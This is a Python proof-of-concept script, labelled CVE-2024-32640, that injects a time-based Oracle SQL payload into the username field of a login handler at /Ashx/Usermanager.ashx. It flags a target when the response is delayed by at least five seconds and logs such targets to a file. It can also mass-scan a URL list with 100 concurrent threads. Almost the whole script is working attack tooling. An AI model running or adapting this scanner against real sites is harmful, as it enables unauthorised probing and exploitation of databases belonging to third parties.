import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"User-Agent": "ozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive"}
    data = {"type": "LOGIN", "username": "1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),5)--", "pwd": "1", "vendor": ''}
    url_payload = '/Ashx/Usermanager.ashx'
    url = target+url_payload
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=headers,data=data,verify=False)
        time1 = res2.elapsed.total_seconds()
        if time1  >= 5:
            print(f'[+]{target}存在SQL延时注入')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在SQL延时注入')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()